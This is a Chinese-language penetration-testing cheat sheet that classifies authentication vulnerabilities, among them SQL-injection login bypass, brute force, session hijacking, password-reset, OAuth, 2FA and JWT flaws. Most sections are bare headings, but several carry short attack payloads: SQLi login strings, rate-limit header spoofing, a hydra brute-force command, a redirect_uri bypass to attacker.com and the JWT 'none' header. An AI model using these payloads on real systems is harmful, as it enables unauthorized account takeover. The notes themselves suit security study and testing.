# 认证漏洞详细分类

## 1. 认证绕过

### SQL注入绕过

```
admin'--
admin' or '1'='1
admin' #
```

### 空密码

```
用户名: admin
密码: ' or 1=1--
```

### 大小写绕过

```
admin
Admin
ADMIN
```

---

## 2. 暴力破解

### 常见用户名

```
admin
root
administrator
user
test
```

### 速率限制绕过

```
X-Forwarded-For: 1.2.3.4
X-Real-IP: 1.2.3.4
```

### 工具

```bash
hydra -l admin -P wordlist.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^"
```

---

## 3. 会话劫持

### Cookie窃取

```javascript
document.cookie
```

### Session fixation

```
攻击者先获取Session ID
让用户登录
劫持该Session
```

### Session预测

---

## 4. 密码重置漏洞

### Token可预测

```
重置链接: /reset?token=12345
改为: /reset?token=12346
```

### Token不绑定

```
使用A用户的token重置B用户密码
```

### Token泄露

- Referer泄露
- 邮件泄露
- 响应中返回token

### 密码重置后登录

```
重置密码后自动登录
```

---

## 5. OAuth漏洞

### redirect_uri绕过

```
正常: http://target.com/callback
绕过: http://target.com.attacker.com
http://attacker.com/callback
```

### state参数缺失

### 权限提升

### token泄露

---

## 6. SAML漏洞

### XML签名绕过

### SAML重放

### 断言注入

### 证书替换

---

## 7. 2FA绕过

### 暴力破解

```
验证码4位: 0000-9999
验证码6位: 000000-999999
```

### 2FA码复用

```
同一验证码可重复使用
```

### 备份码利用

### 绕过2FA

```
直接访问受保护资源
```

---

## 8. 验证码绕过

### 验证码复用

### 验证码可预测

### 删除验证码参数

### 验证码IDOR

---

## 9. 记住我漏洞

### Cookie伪造

```javascript
// 伪造remember me cookie
```

### 加密算法薄弱

---

## 10. JWT认证漏洞

详见 `jwt.md`

### None算法

```json
{"alg":"none","typ":"JWT"}
```

### 密钥混淆

### 密钥爆破

---

## 11. 认证绕过总结

| 方法 | 描述 |
|------|------|
| SQL注入 | 使用永真条件绕过 |
| 暴力破解 | 遍历常见密码 |
| 会话劫持 | 窃取或预测Session |
| 密码重置 | Token可预测/泄露 |
| OAuth | redirect_uri绕过 |
| 2FA | 暴力破解/复用 |
